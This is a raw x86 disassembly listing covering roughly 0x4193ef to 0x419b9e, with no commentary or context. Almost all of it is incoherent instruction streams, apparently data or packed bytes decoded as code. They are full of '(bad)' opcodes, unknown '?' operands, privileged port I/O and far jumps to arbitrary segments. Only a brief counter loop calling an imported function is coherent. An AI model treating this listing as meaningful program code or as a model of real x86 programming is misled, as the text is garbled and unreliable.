  4193ef:	cmp    al,0x81
  4193f1:	loope  0x4193a7
  4193f3:	cmp    dl,BYTE PTR [ebx+edx*2]
  4193f6:	ss add esi,eax
  4193f9:	xchg   esp,eax
  4193fa:	sub    DWORD PTR [edi+0x660d2425],0xe00a5c9b
  419404:	or     esi,DWORD PTR cs:[edx+0x76]
  419408:	sbb    eax,DWORD PTR [esi+0x1]
  41940b:	shr    DWORD PTR [ecx-0x13],cl
  41940e:	cld    
  41940f:	nop
  419410:	cli    
  419411:	or     ebp,ecx
  419413:	ret    0x32d7
  419416:	leave  
  419417:	sbb    al,BYTE PTR [ebx-0x7c]
  41941a:	mov    ch,0x71
  41941c:	jne    0x419466
  41941e:	lahf   
  41941f:	cmc    
  419420:	inc    ebp
  419421:	daa    
  419422:	jp     0x419490
  419424:	adc    BYTE PTR [eax+0x55e84e3a],ah
  41942a:	push   edx
  41942b:	sti    
  41942c:	push   ss
  41942d:	fnstcw WORD PTR [edi+ebp*1-0x326445d5]
  419434:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419435:	or     ebx,esi
  419437:	mov    gs,WORD PTR [esi+ebp*1-0x39]
  41943b:	add    BYTE PTR [ebp+ecx*1+0x7d],ch
  41943f:	enter  0xd5f1,0x89
  419443:	(bad)  
  419444:	std    
  419445:	or     eax,0x5f10c475
  41944a:	sub    eax,0x27eba91a
  41944f:	std    
  419450:	jge    0x41947a
  419452:	mov    cl,BYTE PTR [esi]
  419454:	out    0x51,eax
  419456:	pop    es
  419457:	mov    dl,0xbb
  419459:	call   0x2517f24a
  41945e:	push   cs
  41945f:	mov    al,0xcc
  419461:	sti    
  419462:	inc    esi
  419463:	xchg   esp,eax
  419464:	leave  
  419465:	mov    ah,0x63
  419467:	fimul  WORD PTR [edx+0x7d]
  41946a:	ja     0x4193ee
  41946c:	xchg   edi,eax
  41946d:	inc    ebp
  41946e:	ret    0xe02e
  419471:	icebp  
  419472:	push   esi
  419473:	test   cl,cl
  419475:	inc    esi
  419476:	mov    ah,BYTE PTR [edi-0x406a4b2d]
  41947c:	dec    edx
  41947d:	cmp    eax,0xa95ec999
  419482:	jl     0x4194a4
  419484:	ins    DWORD PTR es:[edi],dx
  419485:	fs aad 0xa7
  419488:	rcr    DWORD PTR [eax+edx*4-0x32],1
  41948c:	fcom   QWORD PTR [ebx+edi*1]
  41948f:	jp     0x419466
  419491:	xor    BYTE PTR [esi+0x9],bh
  419494:	and    eax,0xeebf78ef
  419499:	ret    
  41949a:	stos   BYTE PTR es:[edi],al
  41949b:	pop    ebp
  41949c:	and    ch,BYTE PTR [ecx-0x7fc1c191]
  4194a2:	cmc    
  4194a3:	add    eax,0xf86e6b0b
  4194a8:	xor    al,0xc4
  4194aa:	lods   eax,DWORD PTR ds:[esi]
  4194ab:	int3   
  4194ac:	ins    BYTE PTR es:[edi],dx
  4194ad:	mov    bl,0x93
  4194af:	dec    ebx
  4194b0:	gs je  0x4194d9
  4194b3:	push   esp
  4194b4:	sub    DWORD PTR [esi-0x203e0065],ebp
  4194ba:	test   al,0xed
  4194bc:	clc    
  4194bd:	pushf  
  4194be:	xor    eax,0xab509028
  4194c3:	inc    edi
  4194c4:	and    al,0xc5
  4194c6:	iret   
  4194c7:	pushf  
  4194c8:	cmp    al,0xb9
  4194ca:	push   ebp
  4194cb:	sub    DWORD PTR [edi],eax
  4194cd:	xchg   edi,eax
  4194ce:	or     al,0x84
  4194d0:	ret    
  4194d1:	cmc    
  4194d2:	idiv   DWORD PTR [edx+0x3c]
  4194d5:	rcl    BYTE PTR [esi],cl
  4194d7:	xchg   ebp,eax
  4194d8:	adc    al,0x71
  4194da:	or     edx,DWORD PTR [esi+edx*8-0x34]
  4194de:	ror    BYTE PTR [ebp-0x46],1
  4194e1:	sub    al,0x8a
  4194e3:	lods   eax,DWORD PTR ds:[esi]
  4194e4:	push   edx
  4194e5:	jo     0x41952c
  4194e7:	test   dh,dh
  4194e9:	test   eax,0x45e984b8
  4194ee:	jb     0x41955e
  4194f0:	mov    dh,0xdf
  4194f2:	xor    DWORD PTR [edi],ecx
  4194f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194f5:	xchg   DWORD PTR [esi-0x18],ebp
  4194f8:	test   ax,0xddaf
  4194fc:	and    ecx,DWORD PTR [edx+0x63b504bf]
  419502:	mov    ds:0x7ffe4e0c,eax
  419507:	(bad)  
  419508:	sahf   
  419509:	mov    al,ds:0x22f3f305
  41950e:	dec    esi
  41950f:	sbb    ch,dh
  419511:	sbb    edi,esi
  419513:	outs   dx,BYTE PTR ds:[esi]
  419514:	pop    es
  419515:	mov    bl,bl
  419517:	(bad)  
  419518:	mov    ebp,edx
  41951a:	repnz pushf 
  41951c:	pop    eax
  41951d:	sub    DWORD PTR [ecx],esp
  41951f:	cmp    al,0x2
  419521:	sbb    BYTE PTR [edi],dl
  419523:	into   
  419524:	add    BYTE PTR [edx+ecx*1-0x1bf6d4f9],dh
  41952b:	ret    
  41952c:	xor    ebx,DWORD PTR [ecx]
  41952e:	outs   dx,DWORD PTR ds:[esi]
  41952f:	js     0x419578
  419531:	pop    es
  419532:	test   al,0x12
  419534:	pop    edx
  419535:	dec    edx
  419536:	nop
  419537:	pusha  
  419538:	xchg   ecx,eax
  419539:	sub    eax,0xf6ff7d38
  41953e:	jnp    0x41956d
  419540:	push   ebx
  419541:	stos   BYTE PTR es:[edi],al
  419542:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419543:	sub    ebx,DWORD PTR [ebp+0x1a]
  419546:	lods   al,BYTE PTR ds:[esi]
  419547:	xor    edi,eax
  419549:	xchg   ebx,eax
  41954a:	setle  BYTE PTR [edx+esi*8+0x42]
  41954f:	idiv   DWORD PTR [edx+0x1fda9650]
  419555:	sbb    BYTE PTR [ebx],0xe6
  419558:	cdq    
  419559:	call   0xbbd0c8a8
  41955e:	mov    ebx,0x129ff32b
  419563:	arpl   WORD PTR [esi-0x24a9147d],ax
  419569:	fstp   QWORD PTR [eax-0x1b965906]
  41956f:	adc    BYTE PTR [edx],dh
  419571:	jno    0x4195de
  419573:	out    0x11,eax
  419575:	pop    edx
  419576:	addr16 inc edi
  419578:	stos   DWORD PTR es:[edi],eax
  419579:	adc    DWORD PTR [edi+0x23],0xffffffba
  41957d:	out    dx,eax
  41957e:	pop    edx
  41957f:	inc    ebp
  419580:	and    dl,BYTE PTR [ebp+0x29093193]
  419586:	mov    eax,gs:0xcaee0834
  41958c:	mov    ds,ecx
  41958e:	std    
  41958f:	fcomp  QWORD PTR [ecx-0x612fafc0]
  419595:	pop    ecx
  419596:	push   eax
  419597:	scas   al,BYTE PTR es:[edi]
  419598:	ins    DWORD PTR es:[edi],dx
  419599:	fst    DWORD PTR [esi+0x64]
  41959c:	lods   al,BYTE PTR ds:[esi]
  41959d:	push   ds
  41959e:	inc    eax
  41959f:	xor    DWORD PTR [ebx],edi
  4195a1:	cmp    bl,BYTE PTR [edi+edx*4-0xfa54fad]
  4195a8:	mov    esi,0x19cf1a4a
  4195ad:	pop    esp
  4195ae:	and    ebp,DWORD PTR [ecx+ebp*2]
  4195b1:	adc    ecx,DWORD PTR [eax+eax*4-0x42]
  4195b5:	jg     0x4195f5
  4195b7:	loop   0x4195e9
  4195b9:	lahf   
  4195ba:	add    edx,DWORD PTR [eax-0x37]
  4195bd:	popa   
  4195be:	mov    ch,BYTE PTR [edi-0x132d3412]
  4195c4:	mov    bl,0xd5
  4195c6:	sbb    dl,BYTE PTR [esi]
  4195c8:	push   ds
  4195c9:	push   esi
  4195ca:	pop    edi
  4195cb:	xchg   edx,eax
  4195cc:	xchg   edi,eax
  4195cd:	sub    al,0x71
  4195cf:	xor    DWORD PTR [esp+edx*4-0x4704a80],0xffffffe8
  4195d7:	cmp    eax,0xe4c71809
  4195dc:	sbb    BYTE PTR ss:[ebx-0x71],ah
  4195e0:	cwde   
  4195e1:	cmp    bl,al
  4195e3:	lds    esp,FWORD PTR [ebp-0xd]
  4195e6:	enter  0xb80e,0x4c
  4195ea:	push   esp
  4195eb:	pop    esi
  4195ec:	or     bh,ah
  4195ee:	cli    
  4195ef:	push   es
  4195f0:	push   ebx
  4195f1:	stos   DWORD PTR es:[edi],eax
  4195f2:	add    esp,DWORD PTR [esi+0x15ed20b3]
  4195f8:	xor    ebx,DWORD PTR [eax-0x3af1d7cf]
  4195fe:	mov    esp,ss
  419600:	cmp    al,0x62
  419602:	cmp    cl,dh
  419604:	mov    esp,0xa493fa46
  419609:	shl    BYTE PTR ds:0x107e139f,0xe4
  419610:	cmp    BYTE PTR [ecx+0x43206481],ah
  419616:	ret    0xcec7
  419619:	je     0x4195cb
  41961b:	adc    ah,BYTE PTR [ebx]
  41961d:	push   ss
  41961e:	adc    esp,DWORD PTR [edi+eax*8+0x1621a1ff]
  419625:	jmp    0x5e86:0x1347b20
  41962c:	jecxz  0x419677
  41962e:	fcmovb st,st(0)
  419630:	imul   ebx,esp,0x2ec9bf94
  419636:	cs repnz test al,0xee
  41963a:	repnz cwde 
  41963c:	arpl   WORD PTR [eax+0x32957aac],di
  419642:	cmp    DWORD PTR [edi+0x26],esi
  419645:	loop   0x419696
  419647:	(bad)  
  419648:	or     BYTE PTR [eax-0x2442e43a],dl
  41964e:	and    BYTE PTR [ecx],dl
  419650:	ins    DWORD PTR es:[edi],dx
  419651:	inc    ecx
  419652:	dec    ecx
  419653:	xor    ch,bh
  419655:	enter  0x355,0x7e
  419659:	jne    0x41966b
  41965b:	mov    bh,0x5f
  41965d:	xchg   ebp,eax
  41965e:	xchg   BYTE PTR [esi],bl
  419660:	daa    
  419661:	jge    0x4195fd
  419663:	daa    
  419664:	add    BYTE PTR [edi],dl
  419666:	cld    
  419667:	jl     0x419663
  419669:	mov    edx,DWORD PTR [edx-0x73]
  41966c:	sub    edi,DWORD PTR [edi+eiz*8+0x15]
  419670:	cmp    ebx,ecx
  419672:	(bad)  
  419674:	dec    esp
  419675:	xchg   edx,eax
  419676:	ret    
  419677:	ret    
  419678:	push   eax
  419679:	xchg   ebp,eax
  41967a:	jb     0x419650
  41967c:	adc    eax,0x64213f80
  419681:	and    edx,DWORD PTR ss:[ebp+0x12e3df43]
  419688:	jmp    0x4196fc
  41968a:	cmc    
  41968b:	xlat   BYTE PTR ds:[ebx]
  41968c:	mov    dh,dh
  41968e:	cli    
  41968f:	mov    al,0xab
  419691:	int    0xeb
  419693:	or     al,0x5f
  419695:	inc    esp
  419696:	add    eax,0xadfc7c27
  41969b:	xor    ah,BYTE PTR [ecx-0x2e]
  41969e:	cs fwait
  4196a0:	scas   al,BYTE PTR es:[edi]
  4196a1:	jne    0x41965a
  4196a3:	nop
  4196a4:	and    al,0x27
  4196a6:	pop    esi
  4196a7:	lds    edx,FWORD PTR [edx]
  4196a9:	sbb    BYTE PTR [esi],dl
  4196ab:	inc    eax
  4196ac:	lock je 0x41971e
  4196af:	sub    eax,0x291b3c16
  4196b4:	push   edi
  4196b5:	sbb    BYTE PTR [esi+0x26],al
  4196b8:	mov    cl,0x59
  4196ba:	inc    edx
  4196bb:	fs adc eax,0xc9406c07
  4196c1:	xchg   esi,eax
  4196c2:	xor    eax,0x7deaccb1
  4196c7:	repz mov ds:0xdd1d5571,eax
  4196cd:	ret    
  4196ce:	adc    eax,0x2b054a39
  4196d3:	fsubr  st(4),st
  4196d5:	sub    al,0x25
  4196d7:	mov    ds:0xfcd1a9d9,al
  4196dc:	mov    dl,0x84
  4196de:	jmp    0x4196ee
  4196e0:	jbe    0x41973d
  4196e2:	mov    bl,0x6d
  4196e4:	pop    eax
  4196e5:	or     eax,0x5e4bf758
  4196ea:	cmp    BYTE PTR [eax],0xdf
  4196ed:	in     al,dx
  4196ee:	lods   al,BYTE PTR ds:[esi]
  4196ef:	in     al,dx
  4196f0:	into   
  4196f1:	inc    esi
  4196f2:	jecxz  0x41974e
  4196f4:	pop    ebp
  4196f5:	nop
  4196f6:	and    DWORD PTR [ebx-0x7e],edi
  4196f9:	mov    bl,0xee
  4196fb:	(bad)  
  4196fc:	and    ebx,DWORD PTR [edx]
  4196fe:	mov    bh,0x8e
  419700:	nop
  419701:	pop    ebp
  419702:	out    dx,al
  419703:	mov    ds,WORD PTR [esi]
  419705:	cld    
  419706:	fmulp  st(3),st
  419708:	push   0x740b07cb
  41970d:	mov    ebp,0x5af443fe
  419712:	ror    bh,1
  419714:	cmp    al,0xc4
  419716:	or     al,al
  419718:	adc    ecx,DWORD PTR [esi+ecx*1]
  41971b:	mov    BYTE PTR [ecx-0x57],dh
  41971e:	xlat   BYTE PTR ds:[ebx]
  41971f:	shr    dh,1
  419721:	out    dx,eax
  419722:	mov    ah,0xc7
  419724:	inc    ebp
  419725:	sar    BYTE PTR [eax*4+0x5c7f89c],1
  41972c:	lds    esp,FWORD PTR [ebx+0x1e0042]
  419732:	add    BYTE PTR [eax],al
  419734:	cmp    DWORD PTR ds:0x42a3c5,0x0
  41973b:	je     0x419c82
  419741:	cmp    DWORD PTR ds:0x42a3c5,0x20
  419748:	jne    0x41975c
  41974e:	push   0x7cac
  419753:	push   DWORD PTR [ebp-0x20]
  419756:	call   DWORD PTR ds:0x4251e4
  41975c:	mov    edx,DWORD PTR ds:0x42a3c5
  419762:	dec    edx
  419763:	mov    DWORD PTR ds:0x42a3c5,edx
  419769:	jmp    0x419734
  41976e:	adc    edx,edx
  419770:	jmp    0x419c82
  419775:	mov    bh,0xcc
  419778:	rcl    ecx,cl
  41977a:	fcmovnb st,st(5)
  41977c:	fnstcw WORD PTR [eax+0x60]
  41977f:	or     bh,al
  419781:	out    dx,al
  419782:	xchg   ecx,eax
  419783:	jmp    0x7378:0x7ff1067e
  41978a:	jl     0x419804
  41978c:	js     0x419734
  41978e:	test   DWORD PTR [ebx+0x51024170],0xd922cca9
  419798:	outs   dx,DWORD PTR ds:[esi]
  419799:	or     esi,DWORD PTR [ebx]
  41979b:	shl    DWORD PTR [esi],cl
  41979d:	pusha  
  41979e:	adc    ch,BYTE PTR [ecx+0x1]
  4197a1:	inc    ecx
  4197a2:	fst    st(6)
  4197a4:	or     eax,0xe68d451b
  4197a9:	nop
  4197aa:	icebp  
  4197ab:	add    esp,DWORD PTR [edx+edi*8-0x599e4d5e]
  4197b2:	xor    eax,0x4bf2ae15
  4197b7:	jmp    0x34500854
  4197bc:	pop    esp
  4197bd:	dec    bh
  4197bf:	pop    esp
  4197c0:	jecxz  0x41983d
  4197c2:	or     al,0x2d
  4197c4:	leave  
  4197c5:	jge    0x419801
  4197c7:	aas    
  4197c8:	loop   0x4197b9
  4197ca:	mov    cl,BYTE PTR [di]
  4197cd:	es push 0x4c
  4197d0:	push   esp
  4197d1:	fs push ss
  4197d3:	sbb    DWORD PTR [edi],esi
  4197d5:	pop    eax
  4197d6:	and    al,0x46
  4197d8:	sub    al,0xba
  4197da:	into   
  4197db:	int3   
  4197dc:	cmp    BYTE PTR [edx-0x60],bl
  4197df:	xor    ebp,DWORD PTR [edx]
  4197e1:	mov    ebx,0xd9f4d05
  4197e6:	shr    al,0x47
  4197e9:	bound  ebx,QWORD PTR [ebp+0x69]
  4197ec:	cmp    ah,ch
  4197ee:	(bad)  
  4197ef:	std    
  4197f0:	lea    esi,[ecx]
  4197f2:	mov    eax,0xaee2ea3e
  4197f7:	stos   BYTE PTR es:[edi],al
  4197f8:	sub    dh,BYTE PTR [ebx]
  4197fa:	xchg   edi,eax
  4197fb:	pop    ds
  4197fc:	sub    eax,0x97ac83aa
  419801:	add    eax,ebx
  419803:	mov    dh,0x94
  419805:	push   ebx
  419806:	jb     0x4197ed
  419808:	popa   
  419809:	and    DWORD PTR [ecx],0xff6b2535
  41980f:	add    BYTE PTR [esi-0x67ecb8b9],bh
  419815:	(bad)  
  419817:	sub    DWORD PTR ds:0x8639a8ef,ecx
  41981d:	add    BYTE PTR [eax],dl
  41981f:	or     DWORD PTR [ecx],ecx
  419821:	mov    dl,0x22
  419823:	(bad)  
  419824:	in     eax,dx
  419825:	int3   
  419826:	mov    eax,ds:0x21754a04
  41982b:	mov    BYTE PTR [eax+0x57f95285],0x1f
  419832:	je     0x4197bd
  419834:	inc    esi
  419835:	add    ebx,DWORD PTR [ecx+eax*1+0x6]
  419839:	push   ecx
  41983a:	xchg   BYTE PTR [edi+0x2aa2b569],cl
  419840:	inc    edi
  419841:	test   BYTE PTR [eax+edx*2],dh
  419844:	xchg   edi,eax
  419845:	test   bl,cl
  419847:	pop    esp
  419848:	outs   dx,BYTE PTR ds:[esi]
  419849:	jo     0x419802
  41984b:	inc    edx
  41984c:	sbb    edx,ebx
  41984e:	adc    ch,dh
  419850:	add    bl,ah
  419852:	pop    ebp
  419853:	fstp   QWORD PTR [edi]
  419855:	pusha  
  419856:	and    eax,0x1582f526
  41985b:	aas    
  41985c:	xchg   edx,eax
  41985d:	arpl   WORD PTR [esi+0x8382fb7],ax
  419863:	or     ebp,edx
  419865:	in     al,0xfd
  419867:	mov    bl,0xea
  419869:	pop    ds
  41986a:	outs   dx,BYTE PTR ds:[esi]
  41986b:	jnp    0x41986f
  41986d:	iret   
  41986e:	cmc    
  41986f:	xlat   BYTE PTR ds:[ebx]
  419870:	out    0xb4,al
  419872:	add    bl,BYTE PTR [edx+0x280e1e1d]
  419878:	and    DWORD PTR [edx+0x4d02ad56],edx
  41987e:	dec    ecx
  41987f:	test   al,0x72
  419881:	mov    ebx,0x293c8214
  419886:	dec    ebp
  419887:	fcmove st,st(7)
  419889:	inc    ebx
  41988a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41988b:	cwde   
  41988c:	dec    edx
  41988d:	pop    ebx
  41988e:	mov    edx,es
  419890:	in     eax,dx
  419891:	retf   
  419892:	sub    bl,BYTE PTR cs:[eax-0x6f28098b]
  419899:	scas   al,BYTE PTR es:[edi]
  41989a:	jo     0x419839
  41989c:	mov    ds:0x43bebb70,al
  4198a1:	sbb    eax,0xe38fe5f3
  4198a6:	xor    dl,bl
  4198a8:	loopne 0x4198b8
  4198aa:	and    esp,DWORD PTR [esi+0x4a]
  4198ad:	pop    eax
  4198ae:	pop    ebx
  4198af:	cmc    
  4198b0:	mov    ds:0x569fd5c9,eax
  4198b5:	cmp    bl,BYTE PTR [ebx+ebp*2+0x7]
  4198b9:	fsubr  QWORD PTR [ebx]
  4198bb:	jle    0x4198f3
  4198bd:	xchg   edi,eax
  4198be:	nop
  4198bf:	push   es
  4198c0:	into   
  4198c1:	dec    esi
  4198c2:	cmc    
  4198c3:	addr16 out dx,eax
  4198c5:	pop    ebx
  4198c6:	and    BYTE PTR [ecx-0x51],ch
  4198c9:	ret    0x55d4
  4198cc:	aaa    
  4198cd:	xchg   DWORD PTR [edx-0x6c],eax
  4198d0:	scas   eax,DWORD PTR es:[edi]
  4198d1:	icebp  
  4198d2:	lds    edx,FWORD PTR [eax-0x58]
  4198d5:	xchg   esi,eax
  4198d6:	sbb    eax,0x651a88d9
  4198db:	pusha  
  4198dc:	lahf   
  4198dd:	pop    ebp
  4198de:	into   
  4198df:	jnp    0x419867
  4198e1:	jae    0x419891
  4198e3:	mov    ah,bl
  4198e5:	pop    ss
  4198e6:	out    0xdd,al
  4198e8:	mov    WORD PTR [esi],?
  4198ea:	test   edx,ebp
  4198ec:	push   eax
  4198ed:	inc    esi
  4198ee:	sub    ch,bh
  4198f0:	add    al,0xde
  4198f2:	(bad)
  4198f7:	jb     0x41994f
  4198f9:	or     al,0xf4
  4198fb:	xor    eax,0x8a5931f0
  419900:	stos   BYTE PTR es:[edi],al
  419901:	scas   al,BYTE PTR es:[edi]
  419902:	and    edi,DWORD PTR [ecx-0xa]
  419905:	ss scas al,BYTE PTR es:[edi]
  419907:	push   0x81249f4d
  41990c:	adc    esi,DWORD PTR [ebp-0x60ac47]
  419912:	inc    ebx
  419913:	inc    ecx
  419914:	ins    DWORD PTR es:[edi],dx
  419915:	and    BYTE PTR [edx],ah
  419917:	inc    ebp
  419918:	ffreep st(3)
  41991a:	sub    DWORD PTR [ebp-0x1c7083c9],edx
  419920:	in     eax,0x2c
  419922:	sahf   
  419923:	dec    esi
  419924:	jge    0x4198c5
  419926:	shr    BYTE PTR [ebx-0x1c3cdcd4],0x49
  41992d:	jl     0x41992b
  41992f:	mov    ebx,DWORD PTR [eax-0x25]
  419932:	mov    edi,0xfc7d9e3f
  419937:	sbb    ch,BYTE PTR [ebx+0x15]
  41993a:	ficomp DWORD PTR [ebx-0x3f]
  41993d:	leave  
  41993e:	mov    esi,0x3305e0f1
  419943:	loope  0x419944
  419945:	and    esi,edi
  419947:	in     eax,dx
  419948:	sub    eax,0xdbe7ce1c
  41994d:	mov    ch,0x9c
  41994f:	push   ebx
  419950:	mov    DWORD PTR [edx],0x2c273243
  419956:	cmp    al,dl
  419958:	daa    
  419959:	bound  esp,QWORD PTR [esp+edx*8+0x13]
  41995d:	mov    ebx,0x9cd8dac4
  419962:	cwde   
  419963:	or     DWORD PTR [esi+0x78],esi
  419966:	cmp    ebp,DWORD PTR [edi-0x2f]
  419969:	mov    esp,0x4775a91a
  41996e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41996f:	outs   dx,DWORD PTR ds:[esi]
  419970:	cvtps2pd xmm0,QWORD PTR [ecx+0x5e]
  419974:	in     eax,dx
  419975:	test   BYTE PTR [edx+eax*2-0x5fb8efab],0x9d
  41997d:	mov    ecx,0x4691a6
  419982:	jnp    0x4199e8
  419984:	inc    edi
  419985:	or     BYTE PTR [ebp-0x302a962c],0x77
  41998c:	ja     0x41990e
  41998e:	xor    eax,0x3f
  419991:	pop    esi
  419992:	mov    esp,0x81992242
  419997:	inc    ebp
  419998:	sti    
  419999:	bound  ebp,QWORD PTR [edi+0x7e]
  41999c:	mov    bl,0x9e
  41999e:	je     0x419958
  4199a0:	int3   
  4199a1:	sbb    eax,0xfa145174
  4199a6:	pop    ss
  4199a7:	aam    0x8a
  4199a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199aa:	loopne 0x4199f8
  4199ac:	cmp    al,0x9a
  4199ae:	cmc    
  4199af:	clc    
  4199b0:	mov    edx,fs
  4199b2:	jno    0x419a12
  4199b4:	test   al,0x4f
  4199b6:	mov    esi,0xf5059715
  4199bb:	jge    0x419a3b
  4199bd:	add    al,0xcd
  4199bf:	ins    BYTE PTR es:[edi],dx
  4199c0:	jnp    0x419a40
  4199c2:	jle    0x4199e9
  4199c4:	sub    edi,0xfffffff3
  4199c7:	adc    al,0x39
  4199c9:	cdq    
  4199ca:	enter  0x4c32,0xe1
  4199ce:	sahf   
  4199cf:	aas    
  4199d0:	xchg   ecx,eax
  4199d1:	icebp  
  4199d2:	mov    al,0xab
  4199d4:	lds    edx,FWORD PTR [ebx]
  4199d6:	cld    
  4199d7:	sub    ecx,DWORD PTR [esp+edi*4]
  4199da:	add    ah,BYTE PTR [esi]
  4199dc:	add    BYTE PTR [edx],cl
  4199de:	inc    ebx
  4199df:	int    0x68
  4199e1:	pop    edx
  4199e2:	mov    ecx,0xda8b7062
  4199e7:	retf   0x13f4
  4199ea:	mov    al,ds:0x7d6be66d
  4199ef:	pop    eax
  4199f0:	and    esp,ecx
  4199f2:	stos   DWORD PTR es:[edi],eax
  4199f3:	fld    TBYTE PTR [ebx+0x1d]
  4199f6:	out    dx,al
  4199f7:	dec    edx
  4199f8:	pusha  
  4199f9:	out    0xba,eax
  4199fb:	repz mov ds:0x8fe67375,al
  419a01:	sbb    DWORD PTR [ecx],ebx
  419a03:	mov    BYTE PTR [ecx+0x1c7177c1],cl
  419a09:	inc    edi
  419a0a:	and    ah,bh
  419a0c:	push   es
  419a0d:	jl     0x4199ae
  419a0f:	and    al,0x9b
  419a11:	cwde   
  419a12:	sahf   
  419a13:	pop    ebp
  419a14:	mov    bh,0x71
  419a16:	mov    ch,0x18
  419a18:	jb     0x419a0a
  419a1a:	inc    ebp
  419a1b:	aam    0xa6
  419a1d:	sti    
  419a1e:	jge    0x4199eb
  419a20:	mov    eax,ds:0xdf3eeee3
  419a25:	or     DWORD PTR [esi-0x2],edi
  419a28:	mov    ebx,0xdb69735f
  419a2d:	std    
  419a2e:	fnsave [ecx-0x5da0f1ba]
  419a34:	mov    ?,WORD PTR [eax-0x7b]
  419a37:	sbb    DWORD PTR ds:0x16369ee,ecx
  419a3d:	stos   DWORD PTR es:[edi],eax
  419a3e:	cdq    
  419a3f:	inc    ebp
  419a40:	and    eax,0xd7093b8f
  419a45:	jmp    0x419a55
  419a47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a48:	mov    WORD PTR [ecx+0x6f],?
  419a4b:	fs sub ebx,ebx
  419a4e:	pop    edx
  419a4f:	or     al,0x83
  419a51:	fs push ebp
  419a53:	cwde   
  419a54:	dec    esi
  419a55:	js     0x419ac5
  419a57:	pop    es
  419a58:	sub    DWORD PTR [edx],esp
  419a5a:	adc    ah,BYTE PTR [eax-0x370ff5f2]
  419a60:	mov    DWORD PTR [edi+0x76],eax
  419a63:	in     eax,0xc2
  419a65:	sub    cl,BYTE PTR [ecx+ecx*1+0x284d2e08]
  419a6c:	jmp    0xf45:0x7d3ed4ac
  419a73:	mov    cl,ch
  419a75:	lds    ecx,FWORD PTR [ecx+0x32d50b14]
  419a7b:	not    BYTE PTR [edx+edx*2]
  419a7e:	pop    ebx
  419a7f:	neg    BYTE PTR [edx]
  419a81:	clc    
  419a82:	ja     0x419ae8
  419a84:	xchg   ebp,eax
  419a85:	outs   dx,DWORD PTR ds:[esi]
  419a86:	push   ecx
  419a87:	ficom  DWORD PTR [edi-0x1afe9401]
  419a8d:	arpl   WORD PTR [ebp-0x5b],bp
  419a90:	das    
  419a91:	cli    
  419a92:	nop
  419a93:	popf   
  419a94:	adc    DWORD PTR [edx],0x4e
  419a97:	add    eax,0xe792814c
  419a9c:	and    ch,BYTE PTR [ecx+0x2b58c4df]
  419aa2:	mov    ecx,0x8b32afc5
  419aa8:	repnz dec esi
  419aaa:	add    esp,DWORD PTR [edx+0x67108054]
  419ab0:	dec    ecx
  419ab1:	or     BYTE PTR [edx],dl
  419ab3:	and    al,0x8e
  419ab5:	cld    
  419ab6:	bound  ebx,QWORD PTR ds:0x216c
  419abb:	nop
  419abc:	(bad)  
  419abd:	daa    
  419abe:	sbb    eax,eax
  419ac0:	sahf   
  419ac1:	enter  0xc9d8,0xfe
  419ac5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ac6:	push   eax
  419ac7:	out    dx,eax
  419ac8:	popf   
  419ac9:	cmp    bl,BYTE PTR gs:0xb6633444
  419ad0:	lds    ebx,FWORD PTR [edx-0x3e]
  419ad3:	push   ds
  419ad4:	ja     0x419ac3
  419ad6:	dec    esi
  419ad7:	fmul   QWORD PTR [ecx-0x29]
  419ada:	mov    BYTE PTR [esi+ecx*8-0x4ab77075],bh
  419ae1:	out    0x7b,al
  419ae3:	adc    eax,0x20deb527
  419ae8:	or     al,0xc2
  419aea:	rcr    DWORD PTR [ebx-0x726ea1de],cl
  419af0:	dec    edx
  419af1:	add    esp,esi
  419af3:	and    eax,0x94de4115
  419af8:	cmc    
  419af9:	enter  0x8cbd,0x67
  419afd:	xor    BYTE PTR [ecx-0x5a],bl
  419b00:	xor    BYTE PTR [eax],0xc1
  419b03:	into   
  419b04:	aad    0x3b
  419b06:	mov    bl,0x93
  419b08:	mov    al,ds:0xb619e87b
  419b0d:	pushf  
  419b0e:	add    BYTE PTR [ebp+0x74efdeb5],cl
  419b14:	int    0xea
  419b16:	pop    ecx
  419b17:	inc    eax
  419b18:	xchg   esp,eax
  419b19:	jmp    0x605dc422
  419b1e:	sbb    ch,dl
  419b20:	ins    BYTE PTR es:[edi],dx
  419b21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b22:	mov    dl,0x34
  419b24:	mul    BYTE PTR [ebx+0x1277172b]
  419b2a:	test   BYTE PTR [esi+0x488b693f],dl
  419b30:	sub    ah,0xd6
  419b33:	cmp    ch,BYTE PTR [eax]
  419b35:	in     al,0x1
  419b37:	and    al,0x9f
  419b39:	ror    BYTE PTR [eax+0x1b],0x1e
  419b3d:	mov    ch,0xd8
  419b3f:	push   ss
  419b40:	dec    edx
  419b41:	aaa    
  419b42:	mov    al,ds:0xc4ff97a8
  419b47:	dec    eax
  419b48:	cmp    DWORD PTR [eax-0xf8663fa],0x4c
  419b4f:	aam    0x1e
  419b51:	xadd   BYTE PTR [esi+0xe1cdca3],bl
  419b58:	mov    ds:0xa3c50251,eax
  419b5d:	xor    bl,cl
  419b5f:	push   ecx
  419b60:	dec    ecx
  419b62:	push   eax
  419b63:	dec    ebp
  419b64:	mov    eax,ds:0x3bb3d027
  419b69:	push   ss
  419b6a:	dec    eax
  419b6b:	add    DWORD PTR [edi-0x1d],ebp
  419b6e:	ins    BYTE PTR es:[edi],dx
  419b6f:	addr16 popf 
  419b71:	repz pushf 
  419b73:	pop    esp
  419b74:	rcl    DWORD PTR [ebx*8-0x776387cd],1
  419b7b:	shr    DWORD PTR [ebx-0x7bbef144],1
  419b81:	out    dx,al
  419b82:	adc    al,0x20
  419b84:	xchg   ebp,eax
  419b85:	add    ah,BYTE PTR [edi+0x14]
  419b88:	xchg   ecx,eax
  419b89:	pusha  
  419b8a:	sub    ecx,DWORD PTR [ebp-0x42]
  419b8d:	xor    DWORD PTR [ebx-0x740ab0d5],ebp
  419b93:	dec    edi
  419b94:	into   
  419b95:	xor    ebp,DWORD PTR [ebp-0x24]
  419b98:	xor    DWORD PTR [ecx+0x15],edx
  419b9b:	arpl   di,cx
  419b9d:	xlat   BYTE PTR ds:[ebx]
  419b9e:	cmp    eax,0xf9b60371
